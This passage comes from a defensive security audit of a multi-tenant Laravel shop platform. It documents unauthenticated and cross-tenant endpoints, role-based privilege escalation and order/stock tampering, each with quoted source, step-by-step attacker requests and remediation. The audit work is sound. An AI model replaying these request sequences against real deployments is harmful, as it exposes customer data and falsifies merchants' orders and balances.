changes the result of hundreds of queries including the 39 DataTables and the legitimate super-admin
cross-store views (`$adminUser->type !== 'super admin'` bypasses at
`repo-A app/Http/Controllers/Api/DashboardController.php:4614,4759,6932`). And `getCurrentStore()` currently
returns `null` for an unauthenticated caller — that `null` is **load-bearing**, because it is what
accidentally stops SEC-26 from being anonymously exploitable; a refactor that makes it fall back to a
default store would make several HIGH findings CRITICAL. **Prerequisite: write the two-tenant cross-tenant
integration test first.** It does not exist today, and without it this change is unverifiable.

---

#### SEC-04 — Seven admin API list endpoints are unauthenticated and take the tenant from the query string
**CRITICAL · P0 · Status VERIFIED · Implementation: IMPLEMENTED (unprotected)**

**Where.** `repo-A routes/api.php:163-169`:

```php
163: Route::get('categorylist', [DashboardController::class, 'CategoryList'])->middleware(['AdminApiLog']);
164: Route::get('productlist', [DashboardController::class, 'ProductList'])->middleware(['AdminApiLog']);
165: Route::get('variantlist', [DashboardController::class, 'VariantList'])->middleware(['AdminApiLog']);
166: Route::get('orderlist', [DashboardController::class, 'OrderList'])->middleware(['AdminApiLog']);
167: Route::get('couponlist', [DashboardController::class, 'CouponList'])->middleware(['AdminApiLog']);
168: Route::get('shippinglist', [DashboardController::class, 'ShippingList'])->middleware(['AdminApiLog']);
169: Route::get('taxlist', [DashboardController::class, 'TaxList'])->middleware(['AdminApiLog']);
```

`AdminApiLog::handle()` is `return $next($request);`
(`repo-A app/Http/Middleware/AdminApiLog.php:19-22`) — it authenticates nothing. The immediate siblings at
`:161`, `:162`, `:171`, `:172` **do** carry `custom.auth`; these seven were missed. That inconsistency
inside a seven-line block is the signature of hand-maintained middleware lists.

**Attacker path.** Actor: anonymous internet visitor, no account, no token, no cookie.
`GET /api/admin/orderlist?store_id=1&per_page=100`. The framework `api` group adds no auth and no throttle
(`repo-A bootstrap/app.php:15-65` adds neither; `app/Http/Kernel.php` does not exist). The handler
(`repo-A app/Http/Controllers/Api/DashboardController.php:907-995`) validates `store_id` as an **integer
only** at `:909-916`, resolves `Store::find($request->store_id)` at `:918`, and returns
`Order::where('store_id', $store->id)` paginated at `:926`. Note the precise mechanism: these queries *do*
apply a `store_id` filter — the tenant is simply **chosen by an attacker-supplied parameter** with no
authorization that the caller belongs to it. `App\Models\Order` declares no `$hidden`, so every column
serialises, and `$appends` (`repo-A app/Models/Order.php:49-57`) includes `user_name`, whose accessor at
`:209-221` returns the customer's name or e-mail.

Then increment `store_id` over the sequential `stores` primary key. A non-existent store returns a
"Store not found!" body — and because `repo-A app/Traits/ApiResponser.php:54` defaults `$code = 200`, that
reply is **also HTTP 200**, so enumeration is not even distinguishable by status code and trips no
status-code heuristic. Nothing rate-limits the walk.

**Impact.** Pre-authentication, cross-tenant, unthrottled read of the full order book, order contents,
payment status and per-order customer names/e-mails of **every merchant on the platform**, plus each
tenant's catalogue (including `cost_price`, i.e. merchant margin, at
`repo-A app/Http/Controllers/Api/DashboardController.php:850`), coupon codes, shipping methods and tax
configuration.

**Two precision notes.** The route is `categorylist`, not `categolist`. And `productlist` is additionally
filtered to `->where('product_type', null)` at `:822`, so it returns simple products only, not the whole
catalogue.

**Remediation.** Add authentication to `repo-A routes/api.php:163-169`. **But note carefully**: adding
`custom.auth` would **not** fix this, because `custom.auth` is itself an authentication bypass (SEC-01).
The correct fix is `auth:sanctum` plus server-side tenant resolution — the store must come from the
authenticated user, never from the query string. Check Repo B first: it calls `orderlist`, `productlist`
and `categorylist` (`repo-B lib/utils/base_api.dart`, mapped in the integration dossier), so the mobile
client may currently be relying on the absence of auth.

---

#### SEC-09 — Any self-registered merchant can rewrite or delete the global `super admin` role
**CRITICAL · P0 · Status VERIFIED · Implementation: IMPLEMENTED (unprotected)**

**Where.** `repo-A routes/web.php:335` (`Route::resource('roles', RoleController::class);`) →
`repo-A app/Http/Controllers/RoleController.php:156` (`update`) and `:216` (`destroy`).

```php
156: public function update(Request $request, Role $role)
159:     if(auth()->user() && auth()->user()->isAbleTo('Edit Role'))
182:         $userIds = DB::table('role_user')->where('role_id', $role->id)->pluck('user_id')->toArray();
183:         User::whereIn('id', $userIds)->update(['type' => $input['name']]);
185:         $input['store_id']   = getCurrentStore();
186:         $role->fill($input)->save();
195:         $role->syncPermissions($permissions);
```

`$role` arrives by **implicit route-model binding** with no `store_id` or `created_by` constraint. The only
tenant-aware code in `update()` is a name-collision pre-check at `:161-162` and a `unique` validator at
`:168` scoped to the *caller's* store — both of which an attacker passes trivially by choosing a fresh
role name.

**Attacker path, from the lowest-privileged real actor.**
1. Anonymous visitor self-registers. `repo-A app/Http/Controllers/Auth/RegisteredUserController.php:131-132`
   assigns the single shared global role named `admin`.
2. They log in. `repo-A app/Http/Controllers/Auth/AuthenticatedSessionController.php:83` calls
   `Utility::addNewData()`, which at `repo-A app/Models/Utility.php:2860` resolves that very `admin` role
   and at `:3058-3060` grants it every entry of `$companyNewPermission` — including **"Edit Role"**
   (`:2873`) and **"Delete Role"** (`:2872`). This re-runs on **every login**, so an operator who manually
   revokes the grant has it silently restored.
3. The super admin role is `roles.id = 1` —
   `repo-A database/seeders/PermissionTableSeeder.php:55-64` creates it first, with `created_by => 0` and
   no `store_id`. `repo-A app/DataTables/RoleDataTable.php:46` hides it from the merchant's role list, but
   `repo-A app/Http/Controllers/RoleController.php:133` (`edit`) carries **no ability check at all**, so
   `GET /roles/1/edit` renders the super admin role's edit form and confirms the target.
4. **`PUT /roles/1`** with a new name. Line `:183` rewrites the platform owner's `users.type` from
   `super admin` to an attacker-chosen string — and roughly 80 `users.type == 'super admin'` comparison
   sites in `app/` then evaluate false for the platform owner. Line `:186` additionally re-stamps the
   global role's `store_id` into the attacker's store. Lines `:190-195` strip every permission and replace
   them with whatever was submitted.
5. **Or `DELETE /roles/1`.** `:221` `$role->delete()` cascades `role_user`
   (`repo-A database/migrations/2023_12_08_100022_laratrust_setup_tables.php:46-47`
   `onDelete('cascade')`), stripping the platform owner of all laratrust permissions while leaving
   `users.type = 'super admin'` intact — a partial, confusing lockout. **Note the two verbs fail
   differently** and must not be conflated: UPDATE rewrites `users.type`, DELETE does not.

**Impact.** Platform-owner lockout from the super-admin console — a denial of service against the SaaS
operator — plus attacker-controlled contents of a role the owner's account still holds. Recovery requires
direct database access, because the screens that could repair it are precisely the ones now unreachable.

**All candidate mitigations were checked and are absent:** no Role policy
(`repo-A app/Providers/AuthServiceProvider.php:15-17`), no global scope/`booted()`/trait on
`repo-A app/Models/Role.php` (10 lines, `$guarded = []`, fully mass-assignable), no Role observer
(`repo-A app/Providers/AppServiceProvider.php:30` registers `Order` only), and no permission or tenant
middleware on any enclosing group.

**One caveat bounding the claim.** The `users.type` rewrite at `:183` only fires when the submitted name
**differs** from `super admin`; resubmitting the same name makes it a no-op. This does not reduce impact,
since changing the name is exactly the attacker's action. The seeded `id = 1` and the presence of a single
super-admin holder are inferences from `PermissionTableSeeder.php:55-66`, not observed rows.

**Remediation.** Scope `$role` by `store_id` and `created_by` in `update`, `destroy` **and** `edit`; add
`isAbleTo('Edit Role')` to `edit`; refuse to operate on any role whose `created_by = 0`; intersect
submitted permission ids with the permissions the acting user actually holds (`RoleController.php:99-106`
currently does not); and remove "Edit Role"/"Delete Role" from the bulk merchant grant at
`repo-A app/Models/Utility.php:2872-2873`. Also note `roles.name` is declared globally `->unique()`
(`laratrust_setup_tables.php:19`) despite `roles` having a `store_id` column (`:25`) — a per-tenant role
model on a globally unique name, which is the source of the "already being used in another account"
workaround and means one tenant's choice of role name blocks every other tenant's.

---

#### SEC-37 — `UserController::update` is both a privilege escalation and a cross-tenant user-edit IDOR
**CRITICAL · P0 · Status VERIFIED · Implementation: the ownership check and the field allowlist are both MISSING**
*(Promoted out of Section 2.1, where it had been parked as "asserted but NOT independently verified". Both
limbs were read in source for this document. **Limb 2 was not reported anywhere in the audit before.**)*

**Where.** `repo-A app/Http/Controllers/UserController.php:207-244`. The entire method is gated by one
permission check and nothing else:

```php
public function update(Request $request, $id)                       // :207
{
    if (auth()->user() && auth()->user()->isAbleTo('Edit User'))    // :210
    {
        $user = User::findOrFail($id);                              // :212  <- no ownership scope at all
        // :214-217  e-mail-in-use guard
        // :219-235  validator covering ONLY 'name' and 'email'
        $role          = Role::find($request->role);                // :238  <- tenant-global, unscoped
        $input         = $request->all();                           // :239
        if ($role) {
            $input['type'] = $role->name;                           // :241
        }
        $user->fill($input)->save();                                // :244
    }
}
```

**Limb 1 — privilege escalation by mass assignment.** `:239` takes the whole request body, `:241`
overwrites `type` with the **name of whatever role id the caller submitted**, and `:244` mass-assigns the
result. `'type'` is in `User::$fillable` at `repo-A app/Models/User.php:37` (the array runs `:32-56`), so
the write is accepted. `Role::find($request->role)` at `:238` is a **tenant-global, unscoped** lookup — it
is constrained neither by `created_by` nor by `store_id` nor by which roles the caller is entitled to
assign — so submitting the id of the global `super admin` role sets `type = 'super admin'` on the target
row. Nothing between `:238` and `:244` rejects it: the only validator (`:219-229`) covers `name` and
`email`. The compounding factor is SEC-09: the `roles` rows themselves are writable by any
self-registered merchant, so the attacker does not even need to guess an existing id.

**Limb 2 — cross-tenant user-edit IDOR (previously unreported).** `:212` is
`$user = User::findOrFail($id)` with **no ownership predicate whatsoever** — no
`->where('created_by', …)`, no `->where('current_store', getCurrentStore())`, and no policy, because
`app/Policies` does not exist (Section 1.3). `$id` arrives straight from the route. So the same ordinary
`Edit User` permission that merchants hand to their own staff by default is **also a write primitive
against any `users` row in any other tenant**: `name`, `email`, `mobile`, `is_active`, `current_store`,
`created_by`, `is_enable_login` and `type` are all in `User::$fillable`, so a merchant in tenant A can
rename, deactivate, re-home or take over a user belonging to tenant B by iterating `$id`. The contrast sits
seven lines away in the same method: the e-mail uniqueness rule at `:219-229` **does** scope itself, with
`->where('created_by', \Auth::user()->creatorId())->where('current_store', getCurrentStore())`. The method
therefore knows exactly where the tenant boundary is and does not apply it to the record it is about to
write. This is the same class of defect as SEC-10, reached through a route that merchant staff hold by
design.

**Why CRITICAL / P0 on the evidence.** The actor requirement is low — one permission inside the bulk
merchant grant, not an administrator; both limbs are reachable through the same single request; limb 1
terminates in platform super admin and limb 2 crosses the tenant boundary, which are the two worst
outcomes this platform has. Severity is set on the code that was read: **no exploit was run and no HTTP
request was issued**, consistent with the rest of this document.

**Remediation.** Three cheap changes, and all three are needed:
**(a)** scope the load at `:212` — `User::where('id', $id)->where('created_by', auth()->user()->creatorId())->where('current_store', getCurrentStore())->firstOrFail()`, or introduce a real Policy;
**(b)** stop mass-assigning at `:239`/`:244` — take `$request->only([...])` for the fields this form owns, and set `type` only from a role the caller is permitted to assign;
**(c)** scope the role lookup at `:238` to the acting tenant and intersect it with the caller's own grants.
Item 13 of Section 7 already removes `type`, `created_by`, `plan_id`, `is_active`, `is_enable_login`,
`current_store` and `remember_token` from `User::$fillable` and replaces `fill($request->all())` with
explicit assignment, which closes limb 1 structurally — but it does **not** close limb 2, which needs (a).

---

#### SEC-26 — Three withdrawal payout endpoints have no auth middleware and no permission check
**HIGH · P1 · Status VERIFIED · Implementation: PARTIALLY IMPLEMENTED**
*(Severity corrected downward from CRITICAL by the adversarial pass — reasons below.)*

**Where.** `repo-A routes/web.php:186,189,192`:

```php
186: Route::post('/finance/withdrawals/{id}/approve', [StoreFinanceController::class, 'approveWithdrawal'])
189: Route::post('/finance/withdrawals/{id}/reject', [StoreFinanceController::class, 'rejectWithdrawal'])
192: Route::post('/finance/withdrawals/{id}/pay', [StoreFinanceController::class, 'payWithdrawal'])
```

These sit at file top level. The nearest auth group,
`Route::middleware(['auth', 'permission:View Finance Dashboard'])` at `repo-A routes/web.php:164`,
**closes at `:167`** — 19 lines before them. All three handler bodies were read to their closing brace
(`repo-A app/Http/Controllers/StoreFinanceController.php:644-713`, `:719-884`, `:888-1016`), including
inside the `DB::transaction` closures: zero `auth()->check`, zero `isAbleTo`, zero `Gate`/`authorize`,
zero `type == 'super admin'`. `auth()->id()` appears only as a value written into `reviewed_by`, never as
a guard.

**The corroboration that makes this an omission rather than a design.** Six sibling methods in the **same
controller** each open with an explicit laratrust gate: `:19` `'Edit Finance Payment Status'`, `:71`
`'View Finance Dashboard'`, `:315` `'Add Finance Balance'`, `:396` `'Deduct Finance Balance'`, `:494`
`'Request Finance Withdrawal'`, `:624` `'View Finance Withdrawal Requests'`. The three payout mutators are
the only finance mutators with no gate. Enforcement is page-level only:
`repo-A resources/views/finance/withdrawals.blade.php:170,204` render the Approve and Mark-as-Paid forms
with no `@if(isAbleTo(...))` wrapper — classic UI-only authorization.

**Attacker path.** Actor: a low-privilege merchant staff account in `users` of store X — a shop assistant
— authenticated on the `web` guard with **none** of the finance permissions. Such a user cannot even load
`/finance/withdrawals` (blocked at `:624`) and never sees an Approve button. They log in, scrape a CSRF
token from any page they *can* reach, then `POST /finance/withdrawals/1/approve`: no middleware runs,
`approveWithdrawal` performs no check, `getCurrentStore()` returns X, and withdrawal 1 flips
pending → approved with `reviewed_by` forged to the attacker's id (`:677`). Then
`POST /finance/withdrawals/1/pay`: status → `paid`, `withdrawal_pending_balance` decremented,
`total_withdrawn` incremented (`:946-952`), and a `withdrawal_paid` ledger row written.

**Two corrections that the adversarial pass insisted on, and they must not be dropped.**
1. **"No auth middleware" is literally true but does *not* yield anonymous access**, and the finding must
   not be sold that way. `getCurrentStore()` (`repo-A app/Helper/helper.php:357-380`) has no return
   statement when `auth()->user()` is falsy, so a guest gets `null`;
   `StoreWithdrawal::where('store_id', null)->firstOrFail()` matches nothing, and the resulting
   `ModelNotFoundException` is swallowed into a harmless `back()->with('error')`. CSRF likewise blocks
   cross-site forgery (these paths are absent from the exception list at `repo-A bootstrap/app.php:33-64`).
   The exploitable defect is the missing **permission** check, not the missing `auth` middleware.
2. **No money leaves a bank or gateway.** `payWithdrawal` (`:888-1016`) contains **no** gateway call — it
   is pure DB mutation. The impact is ledger falsification, destruction of maker-checker separation, and
   forged reviewer attribution, not direct exfiltration of funds. Hence HIGH, not CRITICAL. There is also
   **no cross-tenant reach**: all three methods scope by `where('store_id', $storeId)` with `$storeId`
   derived server-side.

**A second, inverted defect in the same module.** The six Finance permission *names* those sibling gates
require are created by **no seeder and no migration anywhere in the repo** — a full-repo literal search
for all six returns only consumer sites. So the guarded six endpoints fail **closed** (HTTP 403 for every
role including super admin, `config/laratrust.php` `handling => abort`) while the three unguarded ones are
reachable. The permission model is inverted. Correct framing: **6 of 10 finance endpoints are unreachable,
3 are unprotected.** The Laratrust admin panel that could create those rows at runtime is disabled at
`repo-A config/laratrust.php:285`, and `RoleController.php:52,104` can only *assign* existing permissions.
"Permanently inaccessible" is too strong — it is remediable with one seeder addition.

**Remediation.** Wrap `repo-A routes/web.php:186-192` in the existing auth+permission group pattern **and**
add in-method `isAbleTo` gates matching the `:494`/`:624` convention (defence in depth), then seed the six
missing Finance permission rows. Treat the 403-lockout and the unprotected-payout halves as one change,
or fixing either alone leaves the module incoherent.

### 1.4 IDOR / BOLA and unauthenticated state change

#### SEC-05 — Unauthenticated cross-tenant order IDOR, as a two-hop chain
**CRITICAL · P0 · Status VERIFIED · Implementation: the tenancy check is MISSING**

The adversarial pass confirmed this but corrected the mechanism: it is a **two-hop chain**, not a
single-request full-order read. The corrected version is used.

**Hop 1 — unauthenticated, completely unscoped.**
`GET /{anyActiveStoreSlug}/order-complete?data[order_id]=N` →
`repo-A app/Http/Controllers/OrderController.php:347`, routed at `repo-A routes/customer.php:144`.

```php
360: if (!empty($request['data']['order_id'])) {
361:     $order_id = $request['data']['order_id'];
362:     $order = Order::find($order_id);
373:     $url = $storeUrl.'/'.$store->slug.'/order/'.\Illuminate\Support\Facades\Crypt::encrypt($order->id ?? '');
```

Attacker-controlled input goes straight into `Order::find()` with **no `store_id` filter, no ownership
check against `auth('customers')`, and no global scope** (`repo-A app/Models/Order.php:11-13` uses only
`HasFactory, Cachable`; `booted()` at `:63-79` hooks only `creating`). The `$store` resolved from the URL
slug at `:349` is never compared to `$order->store_id`. The response renders the victim order's
human-readable number (`repo-A resources/views/front_end/pages/order-complete.blade.php:37`) and —
decisively — the capability token: `:373` builds `$url` with `Crypt::encrypt($order->id)` and the blade
prints it verbatim at `order-complete.blade.php:85`. That block is gated on
`$themeSettings['order_cmp_status'] == '1'`, which defaults to `'1'` in **all three** shipped themes
(`repo-A themes/techzonix/default_data/settings.php:589`,
`themes/greentic/default_data/settings.php:572`, `themes/stylique/default_data/settings.php:570`), so it
renders by default.

**Hop 2 — also unauthenticated.** Replay the token at
`GET /{victimStoreSlug}/order/{token}` → `orderDetails` (`repo-A routes/customer.php:143`). This method
*does* scope by store (`repo-A app/Http/Controllers/OrderController.php:572`
`Order::where('id',$id)->where('store_id',$store->id)->first()` with `abort(404)` at `:574`) — but that is
not an authorization control: it only requires the attacker to put the victim store's **public, enumerable**
slug in the URL, and hop 1 already handed them a fully-formed correct URL. It never checks that the order
belongs to the requesting customer. The page discloses full order contents plus shipping and billing
**name, e-mail, phone, city, state, country and post code**
(`repo-A resources/views/front_end/pages/order-detail.blade.php:131-190`).

**Every suggested refutation was checked and failed.** No auth-bearing enclosing group — the group at
`repo-A routes/customer.php:49` is `[ActiveTheme::class, 'themelanguage']`, required into
`repo-A routes/web.php:973` inside only `['web']` at `routes/web.php:305`; the sole `auth:customers` group
at `routes/customer.php:175-177` wraps **only** `my-account` and opens *after* `:144`. Neither middleware
authenticates (`repo-A app/Http/Middleware/ActiveTheme.php:19-36` resolves a theme, its abort commented
out at `:23-25`; `ThemeLanguage.php:21-38` only sets the locale). No global middleware beyond `SetLocate`
(`repo-A bootstrap/app.php:31`). No `store_id`/`abort`/`Auth::` reference anywhere in
`order-complete.blade.php`, and the view composer that supplies `$themeSettings`
(`repo-A app/Providers/ViewServiceProvider.php:23-67`) resolves the store from the slug and performs no
ownership check. No throttle, so enumeration is unrated.

**Impact.** Order ids are sequential auto-increment primary keys. Iterating `data[order_id]=1..N`
enumerates **every order in the entire multi-tenant installation** and yields a valid detail URL for each
— bulk exfiltration of the whole platform's order book and customer PII by an unauthenticated actor.

**One assumption, labelled.** That `$request['data']['order_id']` is populatable from a GET query string
(`?data[order_id]=5`) rests on documented `Illuminate\Http\Request` ArrayAccess behaviour; `vendor/` is
absent so it could not be cited by file:line. It is **not load-bearing**: the same unscoped `Order::find()`
is also reached via `$request->responce['data']['order_id']` at
`repo-A app/Http/Controllers/OrderController.php:364-365`.

**Residual gap to fix in the same pass.** `order.details` (`repo-A routes/customer.php:143`) is itself an
unauthenticated, customer-ownership-free order read whose only gate is possession of an encrypted id plus
the public store slug. **Fixing `orderComplete` alone does not close it.** Both need an `auth:customers`
guard plus a `customer_id` ownership check, or a signed, single-use, session-bound confirmation token.

---

#### SEC-06 — Thirty order and refund mutation routes sit outside every authentication group
**CRITICAL · P0 · Status VERIFIED**

**Where.** The authenticated group opens at `repo-A routes/web.php:326`
(`['auth','xss','setlocate','verified']`) and **closes at `:938`**. The `['web']` group opens at `:305`
and closes at `:974`. Everything between `:939` and `:973` is therefore inside `web` but **outside
`auth`** — verified by direct read of the brace structure. That block contains:

```php
945:  Route::post('order-return', [OrderController::class, 'order_return'])->middleware('themelanguage');
949:  Route::post('order-status-change/{id}', [OrderController::class, 'order_status_change'])->middleware('themelanguage');
950:  Route::post('order-payment-status', [OrderController::class, 'order_payment_status'])->middleware('themelanguage');
953:  Route::post('update-order-status/{id}', [OrderController::class, 'updateStatus'])->middleware('themelanguage');
955:  Route::post('order-return-request', [OrderController::class, 'order_return_request'])->middleware('themelanguage');
957:  Route::post('update-refund-status', [OrderRefundController::class, 'updateRefundStatus'])->middleware('themelanguage');
959:  Route::post('refund-stock', [OrderRefundController::class, 'RefundStock'])->middleware('themelanguage');
961:  Route::post('/refund-amount/{id}', [OrderRefundController::class, 'RefundAmonut'])->middleware('themelanguage');
```

`themelanguage` carries no authorization — `repo-A app/Http/Middleware/ThemeLanguage.php:21-38` only calls
`App::setLocale()`. No mitigation exists outward: no `app/Http/Kernel.php`, no provider calling
`appendToGroup`/`prependToGroup`, no `__construct` middleware on `OrderController` or
`OrderRefundController`, no FormRequest, no `$request->validate()` in the mutating bodies, no global scope
on `App\Models\Order` (`repo-A app/Models/Order.php:63-80` registers only a `creating` currency hook), and
no shadowing wildcard POST before `:950`.

**Attacker path.** Actor: anonymous internet visitor, no account of any kind.
**Step 1:** `GET /login` (public). Laravel's `StartSession` issues a session cookie and
`repo-A resources/views/layouts/guest.blade.php:138` renders
`<meta name="csrf-token" content="{{ csrf_token() }}">` — scrape it.
**Step 2:** `POST /order-payment-status` with that cookie and `_token`, body
`order_id=<any small integer>&payment_status=Paid`. The request reaches
`repo-A app/Http/Controllers/OrderController.php:556-564`, a four-line body with no auth check, no store
scope and no validation: `Order::find($request->order_id)`, assign the attacker-supplied
`payment_status`, save.

**The one surviving control, named honestly.** CSRF **is** enforced (these paths are not in the exception
list at `repo-A bootstrap/app.php:33-64`), so a bare token-less POST returns 419, and this is **not**
forgeable from an attacker-controlled website against a logged-in victim. The accurate phrasing is
"unauthenticated, exploitable in two requests by any anonymous visitor" — a speed bump, not
authentication.

**Impact — the unconditional half.** An anonymous actor can mark arbitrary orders across **all tenants**
as `Paid`, `Delivered` or `Refunded`, set an attacker-chosen refund amount, and trigger stock restoration.
`OrderRefundController::index()` at `:27` *does* gate on
`isAbleTo('Manage Order Refund Request')` — the read view is protected while the mutating AJAX endpoints
are not, which is why this was easy to miss.

**Impact — the conditional half (wallet).** `repo-A app/Providers/AppServiceProvider.php:30` registers
`OrderObserver`; `repo-A app/Observers/OrderObserver.php:32-38` calls `syncFromOrder` on a
`payment_status` change; `repo-A app/Services/OrderFinancialService.php:244-253` routes Unpaid → Paid to
`markFinancialAsPaid`, which at `:303-345` genuinely **credits** `available_balance` and `total_income`
and at `:364-389` writes an `order_paid` ledger row with `created_by => auth()->id()` — i.e. NULL for an
anonymous attacker. The inflated `available_balance` then gates withdrawal requests at
`repo-A app/Http/Controllers/StoreFinanceController.php:532-551`. The reverse is also exposed:
`repo-A app/Models/Order.php:513` sets `payment_status = 'Unpaid'` on cancel, so
`/order-status-change/{id}` **debits** and can drain a balance.
**Caveat:** `syncFromOrder` returns early at `repo-A app/Services/OrderFinancialService.php:228-235` when
no `store_order_financials` row exists, and that table has **no migration anywhere in the repo**
(see Section 4.2). Because `OrderObserver.php:18-20,39-41` swallows exceptions into `\Log::error`, a
missing table does not block `$order->save()`. So the **order-record falsification is unconditional**,
while the **wallet movement is conditional** on the live database actually having those tables.

**Remediation.** Move `repo-A routes/web.php:940-973` inside the `auth` group at `:326` and add
`permission:` middleware per endpoint; add `isAbleTo` + `store_id` scoping inside each handler. Verify
nothing in the storefront legitimately calls these — `order.payment.status` is defined once and its only
callers are merchant-admin Blade views (`repo-A resources/views/order/view.blade.php:693`), confirming
admin-only intent.

---

#### SEC-07 — `status-cancel`: anyone can change any order's status and inflate stock without bound
**CRITICAL · P0 · Status VERIFIED**

**Where.** `repo-A routes/customer.php:142` (`POST {storeSlug?}/status-cancel`, no `->middleware()`) →
`repo-A app/Http/Controllers/OrderController.php:593-615`.

```php
593: public function status_cancel(Request $request, $slug)
595:     $data['order_id'] = $request->order_id;
596:     $data['order_status'] = $request->order_status;
597:     $responce = Order::order_status_change($data);
598:     $order_detail = Order::order_detail($request->order_id);
602:     foreach ($order_detail['product'] as $item) {
603:         if ($item['variant_id'] == 0) {
604:             $product = Product::where('id', $item['product_id'])->first();
605:             $prdduct_stock = $product->product_stock + $item['qty'];
615:     if ($responce['status'] == 'success') {
```

**Attacker path.** Anonymous actor, no account. Step 1: `GET` any storefront page to obtain a session
cookie and the CSRF token rendered unconditionally at
`repo-A themes/greentic/views/front_end/layouts/app.blade.php:9`. Step 2:
`POST /<any-slug>/status-cancel` with body `order_id=<integer>&order_status=cancel`. The `{storeSlug?}`
segment is cosmetic — `ActiveTheme` looks it up only to pick a theme and does not abort when it misses
(`repo-A app/Http/Middleware/ActiveTheme.php:21-25`) — and the handler never compares the slug's store to
the order's `store_id`. `order_id` is a raw auto-increment integer (the legitimate UI posts the raw id at
`repo-A resources/views/front_end/pages/order-detail.blade.php:302`), so it is trivially enumerable across
every tenant.

**Per request the attacker obtains:** (a) any order in **any** store flips to `delivered_status = 2` with
`cancel_date` set (`repo-A app/Models/Order.php:509-510` — no `customer_id` or `store_id` check anywhere
in `:496-521`); (b) its `payment_status` is forced to `'Unpaid'` (`:513`), which fires
`OrderObserver::updated` → `syncFromOrder`, **reversing the merchant's recorded revenue**; (c) every line
item's stock is credited back (`OrderController.php:602-613`).

**Unbounded inflation — the decisive control-flow detail.** On the second and every later POST for the
same `order_id`, `delivered_status` is now `2`, so `order_status_change` returns `status = 'error'` at
`repo-A app/Models/Order.php:503-507` **without touching the order**. But the controller discards that
result until `:615` — the stock loop at `:602-613` has **already executed**. So *N* POSTs add *N × qty* to
`products.product_stock`. An attacker loops until an item's stock is arbitrarily large, after which the
store oversells inventory it does not hold.

**Variant with the same guard-less path.** Send `order_status=delivered` instead and
`repo-A app/Models/Order.php:575-583` sets `delivered_status = 1` on a stranger's order, which also
permanently blocks that customer's own legitimate cancellation (the `delivered_status != 0` gate at
`:503`).

**Minor precision note, which does not reduce severity.** The restore loop reads `$item['qty']`, but
`Order::order_detail` emits the key `quantity` instead of `qty` for `payment_type == 'POS'` orders
(`repo-A app/Models/Order.php:264-276` vs `:277-287`), so POS orders add `null` (no inflation) while
ordinary storefront orders inflate correctly.

**Remediation.** Require `auth:customers` plus a `customer_id` ownership check and a `store_id` match;
move the stock-restore loop **inside** the `if ($responce['status'] == 'success')` block; make the whole
operation idempotent and transactional.

---

#### SEC-13 and SEC-14 — Unauthenticated custom integration endpoints
**CRITICAL · P0 · Status VERIFIED**

These four endpoints are **this team's own code**, added in commit `f33e8525`, not inherited from the
Workdo product. Each was re-read in the current tree.

**SEC-13 — any merchant's Zid orders, using their decrypted credentials.**
`repo-A routes/web.php:978-980`:

```php
978: Route::get('/zid/{storeId}/orders', function ($storeId) {
979:     return Zid::store($storeId)->get('/managers/store/orders')->json();
980: });
```
**No middleware.** The group that would have supplied `auth` closed at `repo-A routes/web.php:974`, and
the very next route declares one explicitly — `repo-A routes/web.php:982-984` ends
`->middleware('auth')`. That adjacency is why this reads as an omission, not a public endpoint.
`repo-A app/Services/Zid.php:11` looks the tenant up by the **path parameter** and `:15-16` decrypts their
stored OAuth credentials with `Crypt::decryptString`. So `GET /zid/{any integer}/orders` returns that
merchant's live order list — customer names, addresses, phone numbers, order values — to an anonymous
caller, with `{storeId}` a small enumerable integer. `use App\Services\Zid;` is present at
`repo-A routes/web.php:7`, so the symbol resolves and the route is live rather than 500-ing.

**SEC-14 — unauthenticated, unsigned order-status mutation, duplicated, one accepting GET.**
`repo-A routes/web.php:1026` is a top-level closure with **no middleware** accepting **GET as well as
POST**:

```php
1026: Route::match(['GET', 'POST'], '/api/delivery-syria/orders/update-status', function (\Illuminate\Http\Request $request) {
1027:     $productOrderId = $request->input('product_order_id');
1028:     $status = $request->input('status');
```
It looks the order up, maps the status, decrypts the merchant's Zid credentials and pushes the change to
Zid **as that merchant** (`:1083-1100`). There is no shared secret, no HMAC, no IP allowlist and no auth
anywhere in `:1026-1100`. Because it accepts GET, it fires from a plain `<img>` tag or a visited link, so
CSRF protection is irrelevant by construction. The 404 branches also leak data — `:1047` echoes
`zid_order_id`, `:1078` echoes `store_id` — giving a free order-existence and tenant oracle.

The **same logic is duplicated** at
`repo-A app/Http/Controllers/DeliverySyriaStatusController.php:57-102`, routed at
`repo-A routes/api.php:376-379` with no middleware array at all, and that path is *additionally*
CSRF-exempt by the explicit entry at `repo-A bootstrap/app.php:62` — belt-and-braces removal of the one
control that was left. `repo-A routes/api.php:381-384` adds
`GET /api/delivery-syria/zid-statuses-test`, unauthenticated, with a **hardcoded tenant id** that
decrypts one specific merchant's OAuth credentials and proxies them to `api.zid.sa`
(`DeliverySyriaStatusController.php:18-33`) — a debug endpoint shipped to production.

**The contrast that proves this is fixable, and the template to copy.**
`repo-A routes/api.php:35-38` → `DeliverySyriaOrderController::updateStatus` also has no route middleware
but authenticates **properly inside the controller**: an `X-Platform` header check (`:25-32`), a required
bearer token (`:39-46`), and a constant-time compare against the store owner's secret —
`hash_equals($storedSecret, $secret)` at `:163`. That endpoint is **not a finding**. Likewise the Zid
webhook at `repo-A routes/web.php:987-998` **does** verify a shared secret (`:988-989`). The two
DeliverySyria controllers were written to different standards.

**Remediation.** Add `->middleware('auth')` to `repo-A routes/web.php:978` (copy `:984`); **delete** the
`repo-A routes/web.php:1026-1120` closure outright, since `DeliverySyriaStatusController` already
implements it and two copies of unauthenticated logic is how one gets fixed and the other forgotten; add
`hash_equals` secret verification to `repo-A routes/api.php:376`, modelled on the sibling at
`DeliverySyriaOrderController.php:157-163`; **delete** `repo-A routes/api.php:381-384` and
`DeliverySyriaStatusController::zidStatuses`. Coordinate the secret with DeliverySyria, or status
callbacks stop.

**Residual issues in the one *good* webhook, worth fixing in the same pass.**
(a) `===` on a secret instead of `hash_equals()` (`repo-A routes/web.php:988-989`) — timing-unsafe, LOW in
practice. (b) **Latent fail-open**: if `config('services.zid.hook_pass')` were ever `null`, a request with
no `X-Hook-Secret` header yields `null === null` → `true`. Not currently exploitable because the secret is
hardcoded and populated (`repo-A config/services.php:34`) — but it **becomes live the moment someone does
the right thing and moves it to `.env` without setting it**, so fix it *while* fixing SEC-16.
(c) Over-broad destructive trigger at `repo-A routes/web.php:1012-1013`: a `str_contains` substring match
anywhere in the whole JSON body deletes that merchant's stored Zid credentials; it should match the event
type exactly. (d) Rejected bodies are logged with 500 characters of payload (`:992-996`), so a caller who
mistakenly sends the secret in the body writes it to the log.

---

